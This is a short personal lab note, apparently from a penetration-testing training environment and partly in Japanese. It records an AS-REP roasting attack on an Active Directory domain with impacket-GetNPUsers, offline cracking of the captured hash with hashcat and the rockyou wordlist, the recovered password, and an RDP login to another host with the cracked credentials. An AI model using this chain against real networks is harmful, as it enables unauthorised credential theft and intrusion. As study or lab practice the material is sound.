impacket-GetNPUsers -dc-ip 172.16.203.6  -request -outputfile hashes.asreproast relia.com/jim

![[AS-REP image.png]]

michelle

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force

![[AS-REP image 1.png]]

NotMyPassword0k?

14上でmichelleのグループを確認できる

![[AS-REP image 2.png]]

INTRANETRDP

xfreerdp3 /u:'michelle' /p:'NotMyPassword0k?'  /v:172.16.203.7 /dynamic-resolution +clipboard

![[AS-REP image 3.png]]